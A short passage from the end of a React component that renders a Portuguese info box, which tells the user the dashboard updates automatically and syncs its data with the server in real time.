              <h3 className="text-white font-semibold mb-1">Sistema em Tempo Real</h3>
              <p className="text-white/60 text-sm">
                Este painel atualiza automaticamente. Todos os dados são sincronizados com o servidor em tempo real.
              </p>
            </div>
          </div>
        </div>
      </div>
    </Layout>
  );
}
